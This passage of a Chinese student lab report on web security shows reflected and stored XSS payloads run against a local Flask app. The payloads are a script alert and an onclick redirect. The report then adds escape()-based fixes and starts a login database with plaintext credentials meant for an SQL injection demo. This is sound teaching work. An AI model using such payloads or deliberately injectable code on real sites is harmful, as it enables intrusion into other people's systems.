在资料目录启动终端并运行&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;conda create --name flask python=3.10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;conda activate flask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pip install flask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flask run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问终端提示的网址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问网页并实现 XSS 反射型与持久型攻击&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/S2ORTKytMAejcm6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问网页并实现 XSS 反射型与持久型攻击&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/42Azk5tsp9U8rQM.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用防御方法，防范 XSS 攻击。可以通过检验输入文字，转其转为全角字符进行防御&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改 app.py 和 index.html，使得网页增加一个登录功能。设计有 SQL 注入隐患的代码，进行攻击，并且展示如何进行防范。这里可以使用使用 SQLite 作为数据库&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/lgCdL4KqWGMIH5B.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设计一个 CSRF 攻击范例&lt;br&gt;
在网站不部署 XSS 防御时，新建一个网页作为恶意网站。&lt;br&gt;
直接访问该恶意网站时会出现跳转至原网站，且当有原网站有合法用户登录时，会成功发起反射型 XSS 攻击。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/qabwGJEKxVpiys7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备&#34;&gt;#&lt;/a&gt; 实验准备&lt;/h2&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;磁盘驱动器：NVMe KIOXIA- EXCERIA G2 SSD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NVMe Micron 3400 MTFDKBA1TOTFH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;显示器：NVIDIA GeForce RTX 3070 Ti Laptop GPU&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;系统型号	ROG Strix G533ZW_G533ZW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;系统类型	基于 x64 的电脑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;处理器	12th Gen Intel(R) Core(TM) i9-12900H，2500 Mhz，14 个内核，20 个逻辑处理器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BIOS 版本/日期	American Megatrends International, LLC. G533ZW.324, 2023/2/21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BIOS 模式	UEFI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;主板产品	G533ZW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;操作系统名称	Microsoft Windows 11 家庭中文版&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;VMware Workstation Pro&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ubuntu 18.04.6 LTS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Kali linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft Windows 11 家庭中文版&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;实验开始&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验开始&#34;&gt;#&lt;/a&gt; 实验开始&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;先打开终端运行 sudo apt install python3 安装 python3 环境&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;先采用 &lt;code&gt;sudo apt update&lt;/code&gt;  和 sudo apt install python3-flask -y 来安装 Flask 框架&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 kali 中创建 topic13 文件夹，包含已经给出的代码资料&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/mdVikAz1RLWUCKv.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在终端上输入命令 python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtbzk5Zmg2Nmwyb2oucHk=&#34;&gt;来运行 app.py&lt;/span&gt;，出现如下图片即表示运行成功。可通过在浏览器访问地址 localhost:5000 或者 127.0.0.1:5000 来访问该地址&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/Mw3Xl8pzHLcexiy.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在首先进行 XSS 反射型实验：在地址上输入 &lt;code&gt;http://127.0.0.1:5000/?content=&amp;lt;script&amp;gt;alert(&#39;XSS反射实验成功！&#39;)&amp;lt;/script&amp;gt;&amp;amp;submit=&lt;/code&gt;  提交，当显示如下弹窗时，则证明攻击成功&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/IiRQ5lsuX9v7bGL.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在执行 XSS 持久型实验：在评论栏输入代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onclick&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;window.location=&amp;#x27;https://www.yuanshen.com&amp;#x27;;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS持久型攻击——原神，启动！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后点击提交新评论，此时网址 https://www.yuanshen.com 便已经被存储在评论 XSS 持久型攻击 —— 原神，启动！里面了。点击该评论跳转原神官网，攻击成功！&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/V5Y2ARQsaxXcdDO.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/ir1c6WLpdB74UKe.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在修改 app.py 的代码来防止 XSS 攻击，修改后代码如下:&lt;/p&gt;
&lt;p&gt;修改地方如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask, render_template, request, escape&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; werkzeug.utils &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; escape&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 假设的评论数据集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dataset = [&lt;span class=&#34;string&#34;&gt;&amp;quot;BIT网络安全课程真有趣&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Web安全演示实验打卡&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;祝同学们都能取得好成绩!&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    query = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.form.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;) == &lt;span class=&#34;string&#34;&gt;&amp;quot;提交新评论&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 通过 escape 函数转义用户输入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            comment = escape(request.form.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;newComment&amp;quot;&lt;/span&gt;).strip())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; comment:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dataset.append(comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;) == &lt;span class=&#34;string&#34;&gt;&amp;quot;提交&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 对查询参数进行转义以防止反射型XSS攻击&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            query = escape(request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt;).strip())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; query:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sub_dataset = [x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; dataset &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; query.lower() &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.lower()]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;, query=query, comments=sub_dataset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 默认情况下渲染页面，展示所有评论&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;, query=query, comments=dataset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;使用了 “escape” 函数来转义用户输入&lt;/li&gt;
&lt;li&gt;对 POST 请求中的‘comment’进行转义&lt;/li&gt;
&lt;li&gt;对 GET 请求中的‘query’进行转义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原因：转义可以将用户输入中的特殊 HTML 字符（如 &amp;lt;,&amp;gt;, &amp;amp;, &amp;quot; 等）转换为它们的 HTML 实体形式（例如，&amp;lt; 转换为 &amp;lt;）。这意味着当浏览器渲染这些转义后的字符时，它们不会被作为 HTML 标签或 JavaScript 代码执行，而是作为普通文本显示。这样，即使用户输入了 &lt;script&gt;alert(‘XSS’)&lt;/script&gt; 这样的代码，它也只会被显示出来，而不会执行&lt;/p&gt;
&lt;p&gt;原因：&lt;br&gt;
（1）&lt;strong&gt;防止反射型 XSS 攻击：&lt;/strong&gt; 通过对 URL 参数（如搜索查询）进行转义，即使攻击者试图通过构造含有恶意脚本的 URL 来发起反射型 XSS 攻击，这些脚本也不会执行。因为在 HTML 中，这些脚本已被转义，不会被浏览器解释为代码&lt;/p&gt;
&lt;p&gt;（2）&lt;strong&gt;防止持久型 XSS 攻击：&lt;/strong&gt; 通过对用户提交的评论内容进行转义，即使攻击者在评论中嵌入了 JavaScript 代码，这些代码也只会作为普通文本被存储和显示，而不会在其他用户浏览评论时执行。这样，就算这些评论包含了恶意代码，也不会对其他用户造成威胁&lt;/p&gt;
&lt;p&gt;** 测试：** 输入代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1:5000/?content=&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;XSS反射实验成功！&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=提交&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后，显示 &lt;code&gt;“查询评论&amp;lt;script&amp;gt;alert(&#39;XSS反射实验成功！&#39;)&amp;lt;/script&amp;gt;”&lt;/code&gt; ，故该代码未被执行，防止反射型 XSS 攻击成功！&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/LJCDIHqz2f3kK7T.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在评论栏输入代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onclick&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;window.location=&amp;#x27;https://www.yuanshen.com&amp;#x27;;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS持久型攻击——原神，启动！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后，点击提交新评论，显示得到如下评论，故可知道转义后的代码不会被执行，代码会被当做纯文本显示在评论上。&lt;strong&gt;防止 XSS 持久型攻击成功&lt;/strong&gt;！&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/oeh6iEVf2LRJuCk.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在终端输入命令 python -c &amp;quot;import sqlite3&amp;quot; 来导入 sqlite3 模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Flask 中创建一个名为‘init_db.py’的 Python 文件，然后运行该文件创建初始化数据库和用户表‘login.db’。这里创建了一个初始账户，账号为 sky，密码为 sky666.&lt;br&gt;
 源码如下:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sqlite3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connection = sqlite3.connect(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.db&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cursor = connection.cursor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 创建一个用户表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cursor.execute(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 插入示例用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cursor.execute(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;INSERT INTO users(username, password) VALUES (&amp;#x27;sky&amp;#x27;, &amp;#x27;sky666&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connection.commit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connection.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建一个 login.html，增加登录和注册功能，源码如下:&lt;/p&gt;
